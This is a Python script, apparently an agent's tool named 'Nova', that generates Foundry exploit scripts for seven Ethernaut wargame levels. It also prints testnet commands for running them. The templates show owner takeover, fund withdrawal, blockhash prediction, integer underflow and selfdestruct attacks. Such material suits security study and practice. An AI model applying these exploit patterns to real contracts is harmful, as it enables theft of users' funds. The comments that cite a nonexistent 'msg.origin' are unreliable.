#!/usr/bin/env python3
"""
ether-autopilot.py — Ethernaut Challenge Accelerator
Generates exploit contracts, Foundry scripts, and testnet deployment commands.
Nova's tool for rapid smart contract security research.
"""

import sys
import json
import os
from pathlib import Path
from datetime import datetime

TEMPLATES = {
    "fallback": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IFallback {{
    function contribute() external payable;
    function withdraw() external;
}}

contract Exploit is Script {{
    IFallback public target = IFallback({target});
    
    function run() external {{
        vm.startBroadcast();
        
        // Contribute minimum to become contributor
        target.contribute{{value: 1 wei}}();
        
        // Trigger receive() to become owner
        (bool success, ) = address(target).call{{value: 1 wei}}("");
        require(success, "Fallback failed");
        
        // Withdraw all funds
        target.withdraw();
        
        vm.stopBroadcast();
    }}
}}""",
    
    "fallout": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IFallout {{
    function Fal1out() external payable;
    function collectAllocations() external;
}}

contract Exploit is Script {{
    IFallout public target = IFallout({target});
    
    function run() external {{
        vm.startBroadcast();
        
        // Call the misspelled constructor function
        target.Fal1out{{value: 1 wei}}();
        
        // Collect allocations
        target.collectAllocations();
        
        vm.stopBroadcast();
    }}
}}""",
    
    "coinflip": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ICoinFlip {{
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}}

contract Exploit is Script {{
    ICoinFlip public target = ICoinFlip({target});
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function run() external {{
        vm.startBroadcast();
        
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);
        
        vm.stopBroadcast();
    }}
}}""",
    
    "telephone": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ITelephone {{
    function changeOwner(address _owner) external;
}}

contract Exploit is Script {{
    ITelephone public target = ITelephone({target});
    
    function run() external {{
        vm.startBroadcast();
        
        // tx.origin != msg.origin via proxy contract
        Proxy proxy = new Proxy(address(target));
        proxy.attack(msg.sender);
        
        vm.stopBroadcast();
    }}
}}

contract Proxy {{
    ITelephone public target;
    
    constructor(address _target) {{
        target = ITelephone(_target);
    }}
    
    function attack(address newOwner) external {{
        target.changeOwner(newOwner);
    }}
}}""",
    
    "token": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IToken {{
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}}

contract Exploit is Script {{
    IToken public target = IToken({target});
    
    function run() external {{
        vm.startBroadcast();
        
        // Integer underflow: transfer more than balance
        // Starting balance is 20, transfer any large amount causes underflow
        target.transfer(address(1), 21); // Triggers underflow, gives max uint256
        
        vm.stopBroadcast();
    }}
}}""",
    
    "delegation": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDelegation {{
    function pwn() external;
}}

contract Exploit is Script {{
    address public target = {target};
    
    function run() external {{
        vm.startBroadcast();
        
        // delegatecall allows executing pwn() in context of Delegation contract
        // Changes Delegation's storage (owner), not Delegate's
        (bool success, ) = target.call(abi.encodeWithSignature("pwn()"));
        require(success, "Delegatecall exploit failed");
        
        vm.stopBroadcast();
    }}
}}""",
    
    "force": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Exploit is Script {{
    address public target = {target};
    
    function run() external {{
        vm.startBroadcast();
        
        // selfdestruct sends ETH to any address, bypassing receive/fallback checks
        new ForceSender{{value: 0.001 ether}}(target);
        
        vm.stopBroadcast();
    }}
}}

contract ForceSender {{
    constructor(address _target) payable {{
        selfdestruct(payable(_target));
    }}
}}""",
}

ANALYSIS = {
    "fallback": """
VULNERABILITY: Access control via receive() function
EXPLOIT: Contribute 1 wei to become contributor, then send 1 wei to trigger receive()
which sets owner to msg.sender. Withdraw all funds.
""",
    "fallout": """
VULNERABILITY: Typo in constructor name (Fal1out vs FalLout)
EXPLOIT: Constructor functions with different spelling can be called by anyone.
Call Fal1out() to become owner, then withdraw.
""",
    "coinflip": """
VULNERABILITY: Predictable randomness using blockhash
EXPLOIT: Calculate same coin flip value off-chain/on-chain, guess correctly 10 times.
Use blockhash(block.number - 1) / FACTOR to determine outcome.
""",
    "telephone": """
VULNERABILITY: tx.origin vs msg.origin confusion
EXPLOIT: Use proxy contract to call changeOwner(). tx.origin remains victim,
msg.origin becomes proxy, bypassing the check.
""",
    "token": """
VULNERABILITY: Integer underflow in transfer (Solidity < 0.8)
EXPLOIT: Transfer more than balance causes underflow, resulting in max uint256 balance.
""",
    "delegation": """
VULNERABILITY: delegatecall modifies caller's storage
EXPLOIT: Call pwn() via delegatecall to modify Delegation contract's owner storage slot.
""",
    "force": """
VULNERABILITY: selfdestruct bypasses receive/fallback
EXPLOIT: Create contract with ETH, selfdestruct to target address. Forces ETH transfer.
""",
}

KNOWN_ADDRESSES = {
    "sepolia": {
        "fallback": "0x123...",  # Replace with actual
        "fallout": "0x123...",
        # Add more as discovered
    }
}


def print_usage():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  🦞 Ethernaut Autopilot — Nova's Exploit Generator          ║
╚══════════════════════════════════════════════════════════════╝

Usage: ether-autopilot.py <challenge> [target_address]

Challenges: fallback, fallout, coinflip, telephone, token, delegation, force

Examples:
  ether-autopilot.py fallback           # Generate template only
  ether-autopilot.py fallout 0x123...   # Generate with target address
  ether-autopilot.py list               # List all challenges with analysis

Output:
  - exploit/<challenge>/Exploit.s.sol   # Foundry script
  - exploit/<challenge>/README.md       # Vulnerability analysis
""")


def generate_exploit(challenge: str, target: str = "0x...") -> str:
    """Generate exploit script for given challenge."""
    template = TEMPLATES.get(challenge)
    if not template:
        return None
    return template.format(target=target)


def generate_readme(challenge: str) -> str:
    """Generate README with vulnerability analysis."""
    analysis = ANALYSIS.get(challenge, "Analysis not available.")
    return f"""# {challenge.title()} Exploit

{analysis}

## Execution

```bash
# Dry run
forge script script/{challenge.title()}.s.sol --rpc-url $SEPOLIA_RPC

# Live execution
forge script script/{challenge.title()}.s.sol --rpc-url $SEPOLIA_RPC --broadcast
```

## Verification

Check level completion at: https://ethernaut.openzeppelin.com/level/{challenge}

---
*Generated by Ethernaut Autopilot — Nova's security research tool*
"""


def list_challenges():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  📚 Available Ethernaut Exploits                            ║
╚══════════════════════════════════════════════════════════════╝
""")
    for challenge in TEMPLATES.keys():
        analysis = ANALYSIS.get(challenge, "").strip().split("\n")[0]
        print(f"  🎯 {challenge:<12} — {analysis}")
    print(f"\n  Total: {len(TEMPLATES)} challenges ready")


def main():
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    if command == "list":
        list_challenges()
        return
    
    if command == "help" or command == "-h":
        print_usage()
        return
    
    challenge = command
    target = sys.argv[2] if len(sys.argv) > 2 else "0x..."
    
    if challenge not in TEMPLATES:
        print(f"❌ Unknown challenge: {challenge}")
        print(f"Available: {', '.join(TEMPLATES.keys())}")
        sys.exit(1)
    
    # Create output directory
    out_dir = Path(f"exploit/{challenge}")
    out_dir.mkdir(parents=True, exist_ok=True)
    
    # Generate files
    script_path = out_dir / "Exploit.s.sol"
    readme_path = out_dir / "README.md"
    
    script_content = generate_exploit(challenge, target)
    readme_content = generate_readme(challenge)
    
    script_path.write_text(script_content)
    readme_path.write_text(readme_content)
    
    # Generate deployment command
    deploy_cmd = f"""
forge script exploit/{challenge}/Exploit.s.sol \\
    --rpc-url $SEPOLIA_RPC \\
    --broadcast \\
    -vvvv
""".strip()
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  ✅ {challenge.upper()} Exploit Generated                            ║
╚══════════════════════════════════════════════════════════════╝

📁 Files created:
   • {script_path}
   • {readme_path}

📊 Vulnerability:
   {ANALYSIS.get(challenge, '').strip().split(chr(10))[0]}

🚀 Next steps:
   1. Set target: export SEPOLIA_RPC=https://eth-sepolia.g.alchemy.com/v2/YOUR_KEY
   2. Execute: {deploy_cmd}
   3. Verify on Ethernaut: https://ethernaut.openzeppelin.com/level/{challenge}

⚡ Ready to pwn.
""")
    
    # Log to diary
    diary_entry = f"[{datetime.utcnow().isoformat()}Z] ether-autopilot generated {challenge} exploit\n"
    diary_path = Path("diary.md")
    if diary_path.exists():
        with open(diary_path, "a") as f:
            f.write(diary_entry)


if __name__ == "__main__":
    main()
